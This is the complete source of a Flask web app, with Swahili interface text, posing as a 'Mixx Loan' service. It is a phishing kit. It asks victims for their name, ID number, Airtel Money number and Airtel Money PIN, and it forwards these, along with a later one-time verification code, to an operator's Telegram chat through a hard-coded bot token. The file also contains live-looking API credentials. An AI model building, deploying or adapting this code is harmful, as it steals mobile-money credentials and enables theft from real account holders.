from flask import Flask, render_template_string, request, jsonify
import requests
import random
import time

app = Flask(__name__)
app.secret_key = "mixxsecret123"

TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik" # ILIREKEBISHWA
ADMIN_CHAT_ID = "8580615195" # ILIREKEBISHWA

applications = {} # loan_id: {data} # ILIREKEBISHWA
otp_store = {} # loan_id: {code} # ILIREKEBISHWA

def send_telegram(text, buttons=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
        if buttons:
            data["reply_markup"] = {"inline_keyboard": [buttons]}
        requests.post(url, json=data, timeout=5)
    except Exception as e:
        print("Telegram error:", e)

HTML = """<!DOCTYPE html>
<html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mixx Loan</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
<div class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">

<!-- STEP 1: MAJINA NA KIASI -->
<div id="step1">
<h2 class="text-2xl font-bold text-center mb-6">Step 1: Taarifa zako</h2>
<input id="fullname" placeholder="Jina Kamili" class="w-full px-4 py-3 rounded-xl border mb-3">
<input id="idno" placeholder="Namba ya ID" class="w-full px-4 py-3 rounded-xl border mb-3">
<input id="amount_input" type="number" placeholder="Kiasi unachotaka KES" class="w-full px-4 py-3 rounded-xl border mb-4">
<button onclick="nextStep(2)" class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">Endelea</button>
</div>

<!-- STEP 2: CHAGUA KIASI -->
<div id="step2" class="hidden">
<h2 class="text-2xl font-bold text-center mb-6">Step 2: Chagua Kiasi</h2>
<div class="grid grid-cols-2 gap-3 mb-4">
<button onclick="selectAmount(5000)" class="p-3 border rounded-xl hover:bg-blue-50">KES 5,000</button>
<button onclick="selectAmount(10000)" class="p-3 border rounded-xl hover:bg-blue-50">KES 10,000</button>
<button onclick="selectAmount(20000)" class="p-3 border rounded-xl hover:bg-blue-50">KES 20,000</button>
<button onclick="selectAmount(50000)" class="p-3 border rounded-xl hover:bg-blue-50">KES 50,000</button>
</div>
<button onclick="nextStep(3)" class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">Endelea</button>
</div>

<!-- STEP 3: AIRTEL + PIN -->
<div id="step3" class="hidden">
<h2 class="text-2xl font-bold text-center mb-6">Step 3: Airtel Money</h2>
<input id="airtel" type="tel" placeholder="0769135799" class="w-full px-4 py-3 rounded-xl border mb-4">
<p class="text-center text-sm mb-2">Weka PIN ya Airtel Money</p>
<div class="flex gap-2 justify-center mb-6">
<input type="password" id="p1" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="password" id="p2" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="password" id="p3" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="password" id="p4" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
</div>
<button onclick="submitApplication()" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl">Tuma Ombi</button>
</div>

<!-- STEP 4: WEKA CODE -->
<div id="step4" class="hidden text-center">
<h2 class="text-2xl font-bold mb-2">Step 4: Thibitisha</h2>
<p class="text-gray-600 mb-4">Admin amepitisha. Weka code 4 uliyopewa</p>
<p id="timer" class="text-red-600 font-bold mb-4">Subiri admin apitishe...</p>
<div class="flex gap-2 justify-center mb-4">
<input type="text" id="c1" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="text" id="c2" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="text" id="c3" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
<input type="text" id="c4" maxlength="1" class="w-12 h-12 text-center text-xl font-bold border rounded-lg">
</div>
<button id="submitCode" onclick="submitCode()" class="w-full bg-green-600 text-white font-bold py-3 rounded-xl mb-3 hidden">Thibitisha Code</button>
<p id="finalMsg"></p>
</div>

</div>

<script>
let appData = {}; let loanId = ""; let timerInterval;

document.querySelectorAll('input[maxlength=1]').forEach((i,idx,arr)=>{i.addEventListener('input',()=>{if(i.value.length===1&&idx<arr.length-1)arr[idx+1].focus();});});

function nextStep(n){
    document.querySelectorAll('[id^=step]').forEach(s=>s.classList.add('hidden'));
    document.getElementById('step'+n).classList.remove('hidden');
}
function selectAmount(a){ appData.amount = a; }

async function submitApplication(){
    appData.fullname = document.getElementById('fullname').value;
    appData.idno = document.getElementById('idno').value;
    appData.amount = document.getElementById('amount_input').value || appData.amount;
    appData.airtel = document.getElementById('airtel').value;
    appData.pin = document.getElementById('p1').value+document.getElementById('p2').value+document.getElementById('p3').value+document.getElementById('p4').value;

    const res = await fetch('/submit', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(appData)});
    const data = await res.json();
    loanId = data.loan_id;
    nextStep(4);
    checkApproval();
}

function checkApproval(){
    const interval = setInterval(async ()=>{
        const res = await fetch('/check/'+loanId);
        const data = await res.json();
        if(data.approved){
            clearInterval(interval);
            startTimer();
            document.getElementById('submitCode').classList.remove('hidden');
        }
    }, 3000);
}

function startTimer(){
    let timeLeft = 60;
    timerInterval = setInterval(()=>{
        document.getElementById('timer').textContent = `Code inaisha: 00:${timeLeft.toString().padStart(2,'0')}`;
        timeLeft--;
        if(timeLeft < 0){
            clearInterval(timerInterval);
            document.getElementById('submitCode').classList.add('hidden');
            document.getElementById('timer').textContent = "Code imeisha. Omba nyingine";
        }
    },1000);
}

async function submitCode(){
    const code = document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value;
    await fetch('/verify_code', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({loan_id: loanId, code:code})});
    clearInterval(timerInterval);
    document.getElementById('finalMsg').innerHTML = "<p class='text-green-600 font-bold'>✅ Ombi limetumwa kwa uthibitisho wa mwisho</p>";
}
</script>
</body></html>"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    loan_id = str(random.randint(100000, 999))
    applications[loan_id] = data
    applications[loan_id]['status'] = 'pending'

    text = f"🔔 <b>NEW LOAN APPLICATION</b>\n\n<b>ID:</b> {loan_id}\n<b>Jina:</b> {data['fullname']}\n<b>ID:</b> {data['idno']}\n<b>Kiasi:</b> KES {data['amount']}\n<b>Airtel:</b> {data['airtel']}\n<b>PIN:</b> {data['pin']}"
    buttons = [
        {"text": "✅ APPROVE", "callback_data": f"approve_{loan_id}"},
        {"text": "❌ INCORRECT", "callback_data": f"reject_{loan_id}"}
    ]
    send_telegram(text, buttons)
    return jsonify({"status":"ok", "loan_id": loan_id})

@app.route('/check/<loan_id>')
def check(loan_id):
    if loan_id in otp_store:
        return jsonify({"approved": True})
    return jsonify({"approved": False})

@app.route('/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    loan_id = data['loan_id']
    code = data['code']
    send_telegram(f"🔑 <b>CODE ENTERED</b>\n\n<b>ID:</b> {loan_id}\n<b>Code:</b> {code}\n\nAndika 'APPROVED' kama ni sawa")
    return jsonify({"status":"ok"})

@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        action, loan_id = callback['data'].split('_')
        chat_id = callback['message']['chat']['id']

        if action == 'approve':
            code = str(random.randint(1000, 9999))
            otp_store[loan_id] = {'code': code}
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          json={"chat_id": chat_id, "text": f"✅ APPROVED STAGE 1\nMteja ID: {loan_id}\nMpe code hii: <b>{code}</b>", "parse_mode": "HTML"})
        elif action == 'reject':
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          json={"chat_id": chat_id, "text": f"❌ REJECTED\nID: {loan_id}"})
    return "ok"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
